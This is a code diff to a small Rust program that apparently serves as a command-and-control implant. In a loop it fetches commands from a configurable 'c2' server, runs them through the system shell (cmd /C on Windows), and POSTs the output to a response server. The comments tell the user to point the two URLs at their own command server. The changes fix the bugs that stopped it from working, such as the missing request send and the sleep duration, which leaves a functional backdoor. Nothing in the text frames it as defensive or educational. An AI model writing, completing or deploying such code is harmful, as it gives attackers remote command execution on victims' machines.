@@ -6,31 +6,29 @@
 extern crate reqwest;
 use std::process::Command;
 use std::thread::sleep;
+use std::time::Duration;
 use tokio;
 
 #[tokio::main]
 async fn main() -> Result<(), reqwest::Error> {
-    let c2 = "127.0.0.1:8000/waitkit.txt"; // CHANGE THESE 2 VARIABLES
-    let rs = "127.0.0.1:8000/waitkitresponse"; // c2 is your command server (which should store a
+    let c2 = "http://127.0.0.1:8000/waitkit.txt"; // CHANGE THESE 2 VARIABLES
+    let rs = "http://127.0.0.1:8000/waitkitresponse"; // c2 is your command server (which should store a
                                                // command in plaintext, not HTML) and rs is your
                                                // response server where std will be POSTed to
 
     let client = reqwest::Client::new();
     loop {
-        let res = client.get(c2) // get new command from c2
-            .await?
-            .text()
-            .await?;
+        let res = client.get(c2).send().await?.text().await?;// get new command from c2
 
         client.post(rs)
         .body(exec(res)) // post stdout of exec to response server
         .send()
         .await?;
-        sleep(30);
+        sleep(Duration::from_millis(30000));
     }
 }
 
-fn exec(command: String) -> Vec<u8> { // function to execute a command and return it
+fn exec(command: String) -> Vec<u8> { // function to execute a command and return it's output
     let output = if cfg!(target_os = "windows") {
         Command::new("cmd")
             .args(["/C", &command])
